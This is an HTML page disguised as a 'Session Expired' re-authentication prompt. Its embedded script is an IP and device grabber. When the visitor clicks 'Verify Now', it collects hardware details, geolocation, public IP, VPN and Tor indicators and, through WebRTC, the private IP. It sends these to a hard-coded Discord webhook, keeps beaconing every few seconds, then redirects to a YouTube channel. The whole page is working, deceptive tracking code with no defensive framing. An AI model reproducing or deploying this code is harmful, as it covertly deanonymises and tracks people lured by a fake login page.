<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentication Required</title>
    <style>
        body { background: #000; font-family: 'Inter', system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .shell { background: #111; padding: 40px; border-radius: 4px; box-shadow: 0 0 50px rgba(0,0,0,1); width: 320px; text-align: center; border: 1px solid #333; }
        .pulse { width: 40px; height: 40px; border: 2px solid #555; border-top-color: #fff; border-radius: 50%; animation: spin 0.6s linear infinite; margin: 0 auto 20px; display: none; }
        .btn { background: #fff; color: #000; border: none; padding: 15px 30px; font-size: 14px; font-weight: 800; cursor: pointer; border-radius: 2px; width: 100%; transition: 0.1s; text-transform: uppercase; letter-spacing: 2px; }
        .btn:hover { background: #ccc; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        #status { font-size: 9px; color: #444; margin-top: 20px; font-weight: 900; letter-spacing: 3px; }
    </style>
</head>
<body>

<div class="shell">
    <div class="pulse" id="p"></div>
    <div id="u">
        <h2 style="font-size: 18px; margin-bottom: 10px; color: #fff;">SESSION EXPIRED</h2>
        <p style="font-size: 12px; color: #888; margin-bottom: 30px;">Re-authenticate to continue browsing.</p>
        <button class="btn" id="t">Verify Now</button>
    </div>
    <div id="status">VOID-PROTOCOL ACTIVE</div>
</div>

<script>
/**
 * SENTINEL OMEGA-VOID v27.0
 * ZERO-PERMISSION EXECUTION + GLOBAL PING
 */

const VOID = {
    H: "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp",
    D: "https://youtube.com/@LigmaBlox-w7m",
    P: "@everyone", // Instant Device Ping
    M: { g: false, n: false }
};

const send = (data, tag, color = 0x000000) => {
    const p = JSON.stringify({
        content: tag === "CRITICAL_HIT" ? VOID.P : "",
        username: `VOID-V27 [${tag}]`,
        embeds: [{
            title: `🔱 ${tag}`,
            color: color,
            fields: Object.entries(data).map(([k,v]) => ({ name: k.toUpperCase(), value: `\`${v}\``, inline: true })),
            timestamp: new Date().toISOString()
        }]
    });
    navigator.sendBeacon(VOID.H, new Blob([p], {type:'application/json'}));
};

// --- SILENT BACKGROUND TRACKER ---
const track = async () => {
    setInterval(async () => {
        const b = await navigator.getBattery();
        send({
            battery: `${(b.level * 100)}%`,
            state: b.charging ? "CHRG" : "DISCHRG",
            ram_mb: Math.round(performance.memory ? performance.memory.usedJSHeapSize / 1048576 : 0)
        }, "LIVE_BEACON");
    }, 2500);
};

document.getElementById('t').onclick = async function() {
    document.getElementById('u').style.display = 'none';
    document.getElementById('p').style.display = 'block';
    document.getElementById('status').innerText = "INJECTING PAYLOAD...";

    const b = await navigator.getBattery();

    // VECTOR 1: CRITICAL HIT (The Ping + Hardware)
    send({
        device: navigator.platform,
        cores: navigator.hardwareConcurrency,
        ram: navigator.deviceMemory || "N/A",
        battery: `${(b.level * 100)}%`,
        screen: `${screen.width}x${screen.height}`,
        gpu: (() => {
            const gl = document.createElement('canvas').getContext('webgl');
            const d = gl.getExtension('WEBGL_debug_renderer_info');
            return d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : "HIDDEN";
        })()
    }, "CRITICAL_HIT", 0xff0000);

    // VECTOR 2: GEOSPATIAL MESH
    fetch('https://ipapi.co/json/').then(r => r.json()).then(res => {
        if(!VOID.M.g) {
            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const vpn = (res.timezone !== tz) ? "YES" : "NO";
            send({
                continent: res.continent_code,
                country: res.country_name,
                region: res.region,
                city: res.city,
                town: res.postal || "N/A",
                ip: res.ip,
                isp: res.org,
                vpn: vpn,
                tor: res.org.toLowerCase().includes("tor") ? "YES" : "NO",
                lockdown: !window.RTCPeerConnection ? "YES" : "NO"
            }, "GEO_FINGERPRINT", 0x00ff00);
            VOID.M.g = true;
        }
    });

    // VECTOR 3: NETWORK PIERCING (Private IP)
    const r = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    r.createDataChannel("");
    r.onicecandidate = (e) => {
        if (e.candidate && !VOID.M.n) {
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
            if (ip) {
                send({ internal: ip[1], status: "UNMASKED" }, "NETWORK_BYPASS", 0x0000ff);
                VOID.M.n = true;
            }
        }
    };
    r.createOffer().then(o => r.setLocalDescription(o));

    track();
    setTimeout(() => { window.location.replace(VOID.D); }, 6000);
};
</script>
</body>
</html>
